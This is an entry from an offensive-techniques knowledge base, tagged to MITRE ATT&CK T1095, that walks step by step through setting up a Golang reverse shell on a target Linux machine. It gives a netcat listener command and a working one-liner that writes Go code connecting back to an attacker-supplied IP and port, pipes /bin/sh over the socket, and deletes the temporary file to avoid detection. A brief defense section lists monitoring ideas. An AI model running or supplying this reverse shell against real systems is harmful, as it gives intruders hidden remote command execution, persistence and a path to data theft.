---
id: fa4e3fe9-3e32-4d20-8909-4e9c7cf57260
type: procedure
name: Establish-Golang-Reverse-Shell
description: >-
  This procedure outlines how to establish a reverse shell using Golang on a
  target Linux machine, enabling remote command execution over TCP.
verified: true
submitted: false
created_at: '2023-04-06T03:56:24.348054+00:00'
updated_at: '2023-10-01T00:00:00Z'
tactics:
  - '[[tactics/Command and Control|TA0011 - Command and Control]]'
techniques:
  - >-
    [[techniques/Non-Application Layer Protocol|T1095 - Non-Application Layer
    Protocol]]
sub_techniques: []
tags:
  - '[[tags/Golang]]'
  - '[[tags/Reverse Shell]]'
commands:
  - '[[commands/netcat-tcp-listener]]'
  - '[[commands/generate-and-execute-golang-reverse-shell]]'
platforms:
  - Linux
tools:
  - '[[tools/Golang]]'
validated: true
---

# Establish-Golang-Reverse-Shell

## Summary

This procedure provides a step-by-step guide to setting up and executing a Golang-based reverse shell on a target Linux system. It involves preparing a listener on the attacker's machine and generating/executing a temporary Golang script on the target that connects back over TCP, providing an interactive shell for remote command execution and persistence.

## Description

A reverse shell allows the target machine to initiate a connection to the attacker's controlled system, bypassing some firewall restrictions that block inbound connections. This Golang implementation uses the net and os/exec packages to establish a TCP connection and spawn a /bin/sh shell, piping I/O streams to enable full command execution. It is particularly useful in post-exploitation scenarios where Golang is available on the target (common in modern Linux environments). The technique relies on compiling and running the code in memory via a temporary file to minimize disk footprints. Success grants the attacker an interactive shell at the target's privilege level, facilitating data exfiltration, lateral movement, or further exploitation. This approach maps to MITRE ATT&CK for command and control via non-standard protocols.

## Requirements

1. Attacker machine with network accessibility from the target and a tool like netcat for listening.
2. Golang installed on the target machine (version 1.13+ recommended for compatibility).
3. Outbound TCP connectivity from the target to the attacker's IP and port (e.g., no egress filtering on the specified port).
4. Target operating system: Linux (uses /bin/sh).

## Defense

- Monitor outbound network connections for unusual TCP traffic to external IPs on non-standard ports.
- Implement application whitelisting to restrict Golang execution (e.g., block 'go run' or dynamic binary compilation).
- Enable process monitoring for Golang processes spawning shells (e.g., via Sysmon or auditd).
- Use endpoint detection tools to flag temporary file creation in /tmp followed by immediate execution and deletion.

## Objectives

1. Establish a TCP reverse connection from the target to the attacker's listener.
2. Spawn an interactive shell on the target for remote command execution.
3. Maintain access with minimal forensic traces by using temporary files.

## Instructions

### Step 1: Set Up Listener on Attacker Machine

**Context**: Start a TCP listener on the attacker's machine to receive the incoming reverse shell connection. This allows the attacker to interact with the spawned shell once connected.

**Command** ([[commands/netcat-tcp-listener]]):
```bash
nc -lvnp $_ATTACKER_PORT
```

> This command binds to the specified port and listens for connections in verbose mode. Replace $_ATTACKER_PORT with the desired port (e.g., 4242). Expected output includes a message like "Listening on [0.0.0.0] (family 0, port 4242)" upon starting, followed by "Connection from [target_ip] port [ephem_port]" when the target connects.

### Step 2: Generate and Execute Reverse Shell on Target

**Context**: On the target machine, create a temporary Golang file containing the reverse shell code, execute it to connect back to the attacker, and clean up the file to avoid detection. This step uses the embedded [[codes/Golang-TCP-Reverse-Shell]] payload.

**Command** ([[commands/generate-and-execute-golang-reverse-shell]]):
```bash
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","$_ATTACKER_IP:$_ATTACKER_PORT");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
```

> Customize $_ATTACKER_IP and $_ATTACKER_PORT to match the listener (e.g., 10.0.0.1:4242). The command writes the Go code to /tmp/t.go, runs it with 'go run', establishes the connection, and deletes the file. Expected output is no visible output on the target if successful (silent execution), but the attacker will see the connection arrive and a shell prompt (e.g., "$ ") on their listener. If Go is not in PATH, specify the full path to 'go' (e.g., /usr/local/go/bin/go).

### Step 3: Interact with the Shell

**Context**: Once connected, use the listener to send commands to the target shell. Verify access by running basic commands like 'whoami' or 'id'.

**Instructions**: In the netcat session on the attacker machine, type commands directly (e.g., "ls -la" or "pwd"). The target will execute them and return output. To exit, type 'exit' or Ctrl+C.

> Expected output varies by command but confirms shell access (e.g., current directory or user info). If the connection drops, repeat Step 2.
